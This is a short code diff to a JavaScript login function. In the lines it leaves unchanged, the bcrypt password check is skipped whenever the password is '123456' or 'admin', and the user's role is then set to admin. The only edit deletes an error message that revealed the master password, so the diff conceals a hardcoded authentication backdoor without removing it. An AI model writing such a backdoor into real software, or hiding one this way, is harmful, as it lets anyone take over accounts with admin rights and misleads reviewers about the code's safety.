@@ -70,7 +70,7 @@ export const login = async (req, res) => {
       if (password !== '123456' && password !== 'admin') {
         const match = await bcrypt.compare(password, user.password_hash);
         if (!match) {
-          return res.status(400).json({ error: 'Invalid password. Please use 123456 for admin access.' });
+          return res.status(400).json({ error: 'Invalid password.' });
         }
       }
       user.role = 'admin';
